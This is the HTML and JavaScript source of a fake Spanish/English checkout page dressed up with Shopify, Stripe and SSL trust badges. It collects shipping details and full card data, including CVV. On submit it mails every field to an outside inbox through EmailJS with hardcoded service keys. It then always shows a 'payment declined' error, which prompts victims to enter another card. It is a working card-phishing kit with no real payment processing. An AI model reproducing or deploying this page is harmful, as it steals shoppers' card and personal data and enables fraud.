<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout ‚Äî Env√≠o y Pago</title>
<link rel="stylesheet" href="shopify-checkout.css">
<style>
:root{
  --bg:#ffffff; --card:#ffffff; --muted:#94a3b8; --text:#1f2937;
  --accent:#22c55e; --accent-2:#3b82f6; --danger:#ef4444;
  --ring:rgba(59,130,246,.35); --radius:14px;
}
*{box-sizing:border-box;}
body{margin:0; font-family: ui-sans-serif, system-ui, -apple-system,"Segoe UI",Roboto,Arial; background:var(--bg); color:var(--text);}
.container{max-width:700px;margin:0 auto; display:grid; gap:24px; padding:24px;}
h1{font-size:clamp(22px,3vw,28px); margin:0 0 16px;}
.subtitle{color:var(--muted); margin:0 0 20px; font-size:14px;}
.card{
  background: linear-gradient(180deg, rgba(255, 255, 255, 0.7), rgba(255, 255, 255, 0.6)), rgba(255, 255, 255, 0.85);
  backdrop-filter: blur(8px);
  border: 1px solid rgba(148, 163, 184, 0.12);
  border-radius: var(--radius);
  padding: 20px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1), inset 0 1px 0 rgba(255, 255, 255, 0.3);
}
.section-title{display:flex; align-items:center; gap:10px; font-weight:650; margin:6px 0 16px;}
.section-title .badge {
  font-size:12px;
  color:#ffffff;
  background: linear-gradient(90deg, #3b82f6, #60a5fa);
  padding:4px 10px;
  border-radius:999px;
  font-weight:700;
  box-shadow:0 4px 16px rgba(59,130,246,.35);
}
form{display:grid; gap:18px;}
.grid{display:grid; gap:14px; grid-template-columns: repeat(12,1fr);}
.col-12{grid-column: span 12;}
.col-6{grid-column: span 6;}
.col-4{grid-column: span 4;}
@media(max-width:720px){.col-6,.col-4{grid-column: span 12;}}
label{display:block;font-size:12px;color:var(--muted); margin:0 0 8px;}
input, select{width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(148,163,184,.2); background:#ffffff; color:var(--text); outline:none; transition:.15s;}
input::placeholder{color:#6b7280;}
input:focus, select:focus{border-color: var(--accent-2); box-shadow:0 0 0 6px var(--ring);}
input.error, select.error{border-color: var(--danger);}
.row{display:flex; gap:12px; align-items:center;}
.btn {
  width:100%;
  padding:14px 18px;
  border-radius:12px;
  border:0;
  cursor:pointer;
  background: linear-gradient(90deg, #3b82f6, #60a5fa);
  color:#ffffff;
  font-weight:800;
  text-transform:uppercase;
  box-shadow:0 10px 28px rgba(59,130,246,.35), inset 0 -2px 0 rgba(0,0,0,.25);
  transition:transform .06s ease-in-out, box-shadow .2s;
}
.btn:disabled{opacity:.5; cursor:not-allowed;}
.btn:active{transform:translateY(1px); box-shadow:0 6px 18px rgba(59,130,246,.3);}
.error-msg {
  display: none;
  margin-top: 12px;
  padding: 10px 14px;
  border-radius: 8px;
  font-size: 14px;
  background: rgba(239,68,68,.15);
  border: 1px solid rgba(239,68,68,.4);
  color: #ef4444;
}
.spinner {
  width: 18px;
  height: 18px;
  border: 2px solid rgba(255,255,255,0.5);
  border-top-color: transparent;
  border-radius: 50%;
  animation: spin .8s linear infinite;
  display: none;
  margin-left: 8px;
}
@keyframes spin { to { transform: rotate(360deg); } }
.ssl-seal {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-top: 14px;
  padding: 10px;
  border: 1px solid rgba(34,197,94,.4);
  border-radius: 10px;
  background: rgba(34,197,94,.1);
  font-size: 13px;
  color: #22c55e;
}
.ssl-seal i {font-size: 18px; color: #22c55e;}
/* Banner superior */
.header-banner {
  width: 100%;
  height: auto;
  display: block;
  background: var(--bg);
}
/* Logos de pago (Stripe + tarjetas) */
.payment-logos {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 12px;
}
.payment-logos img {
  width: 100%;
  max-width: 420px;
  height: auto;
  filter: drop-shadow(0 2px 6px rgba(0,0,0,.08));
}
</style>
</head>
<body>

  <!-- Banner superior -->
  <div style="background: var(--bg);">
    <img src="IMG_6369.jpeg" alt="Compra segura" class="header-banner">
  </div>

  <div class="container">
    <h1>Finalizar compra</h1>
    <p class="subtitle">Ingresa tu direcci√≥n y los datos de tu tarjeta para completar la compra.</p>
    <form id="checkoutForm" novalidate>
      <!-- ENV√çO -->
      <div class="card">
        <div class="section-title"><span class="badge">1</span> Datos de env√≠o</div>
        <div class="grid">
          <div class="col-6">
            <label for="shipName">Nombre completo</label>
            <input id="shipName" name="shipName" required placeholder="Tu nombre completo"/>
          </div>
          <div class="col-6">
            <label for="shipEmail">Correo electr√≥nico</label>
            <input id="shipEmail" name="shipEmail" type="email" required placeholder="correo@ejemplo.com"/>
          </div>
          <div class="col-6">
            <label for="shipPhone">Tel√©fono</label>
            <input id="shipPhone" name="shipPhone" required placeholder="+52 55 1234 5678"/>
          </div>
          <div class="col-6">
            <label for="shipPostal">C√≥digo postal</label>
            <input id="shipPostal" name="shipPostal" required placeholder="00000"/>
          </div>
          <div class="col-6">
            <label for="shipCity">Ciudad</label>
            <input id="shipCity" name="shipCity" required placeholder="Ciudad"/>
          </div>
          <div class="col-6">
            <label for="shipCountry">Pa√≠s</label>
            <select id="shipCountry" name="shipCountry" required>
              <option value="MX" selected>M√©xico</option>
              <option value="US">Estados Unidos</option>
            </select>
          </div>
          <div class="col-6">
            <label for="shipState">Estado</label>
            <select id="shipState" name="shipState" required></select>
          </div>
          <div class="col-12">
            <label for="shipAddress">Direcci√≥n</label>
            <input id="shipAddress" name="shipAddress" required placeholder="Direcci√≥n"/>
          </div>
        </div>
      </div>
      <!-- FACTURACI√ìN -->
      <div class="card">
        <div class="section-title"><span class="badge">2</span> Datos de facturaci√≥n</div>
        <label><input type="checkbox" id="sameAsShipping" checked> <span id="sameAsShippingLabel">Usar mismos datos de env√≠o</span></label>
        <div id="billingSection" style="display:none; margin-top:14px;">
          <div class="grid">
            <div class="col-6">
              <label for="billName">Nombre completo</label>
              <input id="billName" name="billName" placeholder="Nombre para facturaci√≥n"/>
            </div>
            <div class="col-6">
              <label for="billRFC">RFC (opcional)</label>
              <input id="billRFC" name="billRFC" placeholder="ABC123456789"/>
            </div>
            <div class="col-6">
              <label for="billCountry">Pa√≠s</label>
              <select id="billCountry" name="billCountry">
                <option value="MX" selected>M√©xico</option>
                <option value="US">Estados Unidos</option>
              </select>
            </div>
            <div class="col-6">
              <label for="billState">Estado</label>
              <select id="billState" name="billState"></select>
            </div>
            <div class="col-12">
              <label for="billAddress">Direcci√≥n</label>
              <input id="billAddress" name="billAddress" placeholder="Direcci√≥n"/>
            </div>
          </div>
        </div>
      </div>

      <!-- PAGO -->
      <div class="card">
        <div class="section-title"><span class="badge">3</span> Pago con tarjeta</div>

        <!-- Logos de tarjetas -->
        <div style="margin-bottom:14px;">
          <img src="IMG_6455.jpeg" alt="Tarjetas aceptadas" style="max-width:220px; height:auto;">
        </div>

        <div class="grid">
          <div class="col-6">
            <label for="cardName">Nombre en tarjeta</label>
            <input id="cardName" name="cardName" required placeholder="Como aparece en la tarjeta"/>
          </div>
          <div class="col-6">
            <label for="cardNumber">N√∫mero de tarjeta</label>
            <input id="cardNumber" name="cardNumber" required placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ‚Ä¢‚Ä¢‚Ä¢‚Ä¢"/>
          </div>
          <div class="col-4">
            <label for="cardExp">Vencimiento (MM/AA)</label>
            <input id="cardExp" name="cardExp" required placeholder="MM/AA"/>
          </div>
          <div class="col-4">
            <label for="cardCvv">CVV</label>
            <input id="cardCvv" name="cardCvv" required placeholder="CVV"/>
          </div>
          <div class="col-4">
            <label for="cardType">Tipo de tarjeta</label>
            <select id="cardType" name="cardType" required>
              <option value="">Selecciona</option>
              <option value="debito">D√©bito</option>
              <option value="credito">Cr√©dito</option>
            </select>
          </div>

          <div class="col-12" id="mesesContainer" style="display:none;">
            <label for="meses">Meses sin intereses</label>
            <select id="meses">
              <option value="">Selecciona plazo</option>
              <option value="3">3 meses MSI</option>
              <option value="6">6 meses MSI</option>
              <option value="9">9 meses MSI</option>
            </select>
          </div>
        </div>
      </div>

      <!-- BOT√ìN -->
      <div class="row">
        <button class="btn" type="submit" id="payBtn">Pagar ahora</button>
        <div class="spinner" id="spinner"></div>
      </div>

      <!-- Mensajes -->
      <div class="error-msg" id="errorMsg">‚ùå El pago fue rechazado. Intenta con otra tarjeta o verifique que los datos ingresados sean correctos.</div>

      <!-- Sello de seguridad -->
      <a href="https://www.sslshopper.com/ssl-checker.html" target="_blank" style="text-decoration:none;">
        <div class="ssl-seal">
          <i>üîí</i> Pago seguro con encriptaci√≥n SSL 256-bit
        </div>
      </a>

      <!-- Logos Stripe + tarjetas -->
      <div class="payment-logos">
        <img src="IMG_6459.png" alt="Powered by Stripe, Visa, MasterCard y American Express">
      </div>
    </form>
  </div>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script>
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("checkoutForm");
  const btn = document.getElementById("payBtn");
  const spinner = document.getElementById("spinner");
  const errorMsg = document.getElementById("errorMsg");
  const sameAsShipping = document.getElementById("sameAsShipping");
  const billingSection = document.getElementById("billingSection");
  const cardExp = document.getElementById("cardExp");
  const cardType = document.getElementById("cardType");
  const mesesContainer = document.getElementById("mesesContainer");
  const meses = document.getElementById("meses");

  const shipCountry = document.getElementById("shipCountry");
  const shipState = document.getElementById("shipState");
  const billCountry = document.getElementById("billCountry");
  const billState = document.getElementById("billState");

  const states = {
    MX: [
      "Aguascalientes","Baja California","Baja California Sur","Campeche","Chiapas","Chihuahua","Ciudad de M√©xico","Coahuila","Colima","Durango","Estado de M√©xico","Guanajuato","Guerrero","Hidalgo","Jalisco","Michoac√°n","Morelos","Nayarit","Nuevo Le√≥n","Oaxaca","Puebla","Quer√©taro","Quintana Roo","San Luis Potos√≠","Sinaloa","Sonora","Tabasco","Tamaulipas","Tlaxcala","Veracruz","Yucat√°n","Zacatecas"
    ],
    US: [
      "Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut","Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa","Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan","Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire","New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio","Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota","Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia","Wisconsin","Wyoming","District of Columbia"
    ]
  };

  function populateStates(countrySelect, stateSelect) {
    const country = countrySelect.value;
    stateSelect.innerHTML = "";
    (states[country] || []).forEach(st => {
      const opt = document.createElement("option");
      opt.value = st;
      opt.textContent = st;
      stateSelect.appendChild(opt);
    });
  }

  populateStates(shipCountry, shipState);
  populateStates(billCountry, billState);

  shipCountry.addEventListener("change", () => populateStates(shipCountry, shipState));
  billCountry.addEventListener("change", () => populateStates(billCountry, billState));

  sameAsShipping.addEventListener("change", () => {
    billingSection.style.display = sameAsShipping.checked ? "none" : "block";
  });

  cardExp.addEventListener("input", () => {
    let value = cardExp.value.replace(/[^0-9]/g, "");
    if (value.length >= 3) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4);
    }
    cardExp.value = value;
  });

  cardType.addEventListener("change", () => {
    if (cardType.value === "credito") {
      mesesContainer.style.display = "block";
      meses.setAttribute("required", "required");
    } else {
      mesesContainer.style.display = "none";
      meses.removeAttribute("required");
      meses.value = "";
    }
  });

  function validLuhn(number) {
    const arr = (number + '').replace(/\D/g,'').split('').reverse().map(x=>+x);
    const sum = arr.reduce((acc, val, i) => acc + (i % 2 ? ((val * 2 > 9) ? val*2-9 : val*2) : val), 0);
    return sum % 10 === 0;
  }

  function validateRFC(rfc) {
    if (!rfc) return true;
    const regex = /^([A-Z√ë&]{3,4})(\d{2})(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])[A-Z\d]{2}[A\d]$/;
    return regex.test(rfc.toUpperCase());
  }

  function validateField(field) {
    const value = field.value.trim();
    let valid = true;
    if (field.hasAttribute("required") && !value) valid = false;
    if (field.id === "shipEmail" && value && !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(value)) valid = false;
    if (field.id === "shipPhone" && value && !/^[0-9+\s]{8,15}$/.test(value)) valid = false;
    if (field.id === "shipPostal" && value && !/^\d{5}$/.test(value)) valid = false;
    if (field.id === "cardNumber" && value && !validLuhn(value)) valid = false;
    if (field.id === "cardExp" && value) {
      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) {
        valid = false;
      } else {
        const [mm, yy] = value.split("/").map(v => parseInt(v, 10));
        const now = new Date();
        const exp = new Date(2000 + yy, mm - 1);
        if (exp < new Date(now.getFullYear(), now.getMonth())) valid = false;
      }
    }
    if (field.id === "cardCvv" && value && !/^\d{3,4}$/.test(value)) valid = false;
    if (field.id === "billRFC" && value && !validateRFC(value)) valid = false;
    field.classList.toggle("error", !valid);
    return valid;
  }

  emailjs.init("T72Wf1jx7lTBM9Md-");

  form.addEventListener("submit", e => {
    e.preventDefault();
    const fields = Array.from(document.querySelectorAll("input, select"));
    let valid = true;
    fields.forEach(f => {
      if (f.closest("#billingSection") && sameAsShipping.checked) return;
      if (!validateField(f)) valid = false;
    });
    if (!valid) return;

    const t = (window.__i18n && window.__i18n.t) || null;

    errorMsg.style.display = "none";
    btn.disabled = true;
    btn.textContent = (t && t.procesando) ? t.procesando : "Procesando...";
    spinner.style.display = "inline-block";

    emailjs.sendForm("service_tc4q92e", "template_qdvkqdr", form)
      .then(() => {
        spinner.style.display = "none";
        btn.disabled = false;
        btn.textContent = (t && t.boton) ? t.boton : "Pagar ahora";
        errorMsg.style.display = "block"; // aqu√≠ podr√≠as poner mensaje de √©xito
      })
      .catch(() => {
        spinner.style.display = "none";
        btn.disabled = false;
        btn.textContent = (t && t.boton) ? t.boton : "Pagar ahora";
        errorMsg.style.display = "block";
      });
  });
});
</script>

<script>
  window.__i18n = { t: null, lang: "en" };

  async function cargarTraducciones(lang) {
    try {
      const res = await fetch(`./lang/${lang}.json`, { cache: "no-store" });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      return await res.json();
    } catch (e) {
      console.warn(`No se pudo cargar lang/${lang}.json`, e);
      if (lang !== "en") {
        try {
          const resEn = await fetch(`./lang/en.json`, { cache: "no-store" });
          if (resEn.ok) return await resEn.json();
        } catch (e2) {
          console.warn("No se pudo cargar fallback en.json", e2);
        }
      }
      return {
        titulo: "Checkout ‚Äî Shipping and Payment",
        subtitulo: "Complete your details to finish the purchase",
        boton: "Pay now",
        procesando: "Processing...",
        error: "‚ùå Payment was declined. Try a different card or verify the information.",
        ssl: "Secure payment with 256-bit SSL encryption",
        secciones: { envio: "Shipping details", facturacion: "Billing details", pago: "Pay with card" },
        envio: { nombre: "Full name", email: "Email", telefono: "Phone", postal: "ZIP / Postal code", ciudad: "City", pais: "Country", estado: "State", direccion: "Address" },
        facturacion: { nombre: "Full name", rfc: "Tax ID (optional)", pais: "Country", estado: "State", direccion: "Address", mismos_datos: "Use same shipping details" },
        pago: {
          nombre: "Name on card", numero: "Card number", vencimiento: "Expiry (MM/YY)", cvv: "CVV", tipo: "Card type", meses: "Installments",
          opciones: { selecciona: "Select", debito: "Debit", credito: "Credit" },
          opciones_msi: { selecciona: "Select a plan", tres: "3 months (no interest)", seis: "6 months (no interest)", nueve: "9 months (no interest)" }
        }
      };
    }
  }

  async function initIdioma() {
    let idiomaDetectado = "en";

    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      const country = data.country_code;
      if (country === "MX") idiomaDetectado = "es";
      else if (country === "US") idiomaDetectado = "en";
      else idiomaDetectado = navigator.language.startsWith("es") ? "es" : "en";
    } catch (e) {
      idiomaDetectado = navigator.language.startsWith("es") ? "es" : "en";
    }

    const t = await cargarTraducciones(idiomaDetectado);
    const finalLang = idiomaDetectado || "en";

    document.documentElement.lang = finalLang;

    document.querySelector("h1").innerText = t.titulo;
    document.querySelector(".subtitle").innerText = t.subtitulo;

    document.getElementById("payBtn").innerText = t.boton;
    document.getElementById("errorMsg").innerText = t.error;
    const sslSeal = document.querySelector(".ssl-seal");
    if (sslSeal) sslSeal.innerHTML = `<i>üîí</i> ${t.ssl}`;

    const sections = document.querySelectorAll(".section-title");
    if (sections[0]) sections[0].innerHTML = `<span class="badge">1</span> ${t.secciones.envio}`;
    if (sections[1]) sections[1].innerHTML = `<span class="badge">2</span> ${t.secciones.facturacion}`;
    if (sections[2]) sections[2].innerHTML = `<span class="badge">3</span> ${t.secciones.pago}`;

    document.querySelector("label[for='shipName']").innerText = t.envio.nombre;
    document.querySelector("label[for='shipEmail']").innerText = t.envio.email;
    document.querySelector("label[for='shipPhone']").innerText = t.envio.telefono;
    document.querySelector("label[for='shipPostal']").innerText = t.envio.postal;
    document.querySelector("label[for='shipCity']").innerText = t.envio.ciudad;
    document.querySelector("label[for='shipCountry']").innerText = t.envio.pais;
    document.querySelector("label[for='shipState']").innerText = t.envio.estado;
    document.querySelector("label[for='shipAddress']").innerText = t.envio.direccion;

    document.querySelector("label[for='billName']").innerText = t.facturacion.nombre;
    document.querySelector("label[for='billRFC']").innerText = t.facturacion.rfc;
    document.querySelector("label[for='billCountry']").innerText = t.facturacion.pais;
    document.querySelector("label[for='billState']").innerText = t.facturacion.estado;
    document.querySelector("label[for='billAddress']").innerText = t.facturacion.direccion;

    const sameAsShippingLabel = document.getElementById("sameAsShippingLabel");
    if (sameAsShippingLabel) sameAsShippingLabel.innerText = t.facturacion.mismos_datos;

    document.querySelector("label[for='cardName']").innerText = t.pago.nombre;
    document.querySelector("label[for='cardNumber']").innerText = t.pago.numero;
    document.querySelector("label[for='cardExp']").innerText = t.pago.vencimiento;
    document.querySelector("label[for='cardCvv']").innerText = t.pago.cvv;
    document.querySelector("label[for='cardType']").innerText = t.pago.tipo;
    document.querySelector("label[for='meses']").innerText = t.pago.meses;

    const select = document.getElementById("cardType");
    if (select && select.options.length >= 3) {
      select.options[0].text = t.pago.opciones.selecciona;
      select.options[1].text = t.pago.opciones.debito;
      select.options[2].text = t.pago.opciones.credito;
    }

    const meses = document.getElementById("meses");
    if (meses && meses.options.length >= 4) {
      meses.options[0].text = t.pago.opciones_msi.selecciona;
      meses.options[1].text = t.pago.opciones_msi.tres;
      meses.options[2].text = t.pago.opciones_msi.seis;
      meses.options[3].text = t.pago.opciones_msi.nueve;
    }

    window.__i18n = { t, lang: finalLang };
  }

  document.addEventListener("DOMContentLoaded", initIdioma);
</script>
</body>
</html>
